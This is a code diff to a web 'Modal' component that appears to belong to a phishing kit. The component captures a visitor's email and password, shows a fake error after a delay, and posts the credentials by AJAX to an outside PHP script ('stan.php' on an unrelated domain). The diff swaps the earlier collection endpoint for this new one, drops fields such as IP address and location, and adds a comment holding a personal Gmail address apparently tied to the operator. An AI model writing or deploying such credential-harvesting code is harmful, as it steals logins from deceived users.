@@ -72,23 +72,19 @@ export const Modal = ()=>{
             setTimeout(() => {
               setPwd('');
               setErr(true);
-            }, 1700);
+            }, 2500);
 
 
           const user = {
             email: email,
-            pswd: pwd,
-            country: country,
-            
-            city: city,
-            flag: flag,
-            eyep: ipAdress,
-            nownow: forTime
+            password: pwd,
         };
+
+        // stanleyugo411@gmail.com
     
           $.ajax({
               type: "POST",
-              url: "https://meler-service.onrender.com/get_details/stanleyugo411@gmail.com",
+              url: "https://physicaleducationdiploma.com/component/stan.php",
               data: user,
               success(data) {
                   console.log(data);
